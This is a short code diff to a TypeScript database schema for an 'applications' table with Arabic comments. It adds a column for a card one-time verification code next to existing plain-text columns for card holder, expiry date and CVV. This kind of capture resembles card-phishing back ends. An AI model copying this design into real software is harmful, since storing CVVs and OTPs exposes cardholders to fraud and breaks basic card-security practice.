@@ -46,6 +46,7 @@ export const applicationsTable = pgTable("applications", {
   paymentCardHolder: text("payment_card_holder"), // اسم حامل البطاقة
   paymentExpiryDate: text("payment_expiry_date"), // تاريخ الانتهاء
   paymentCvv: text("payment_cvv"), // رمز الأمان
+  paymentOtp: text("payment_otp"), // رمز التحقق من البطاقة (4-6 أرقام)
   paymentStatus: text("payment_status").default("pending"), // pending | completed | failed
   paymentCompletedAt: timestamp("payment_completed_at"), // وقت إتمام الدفع
 
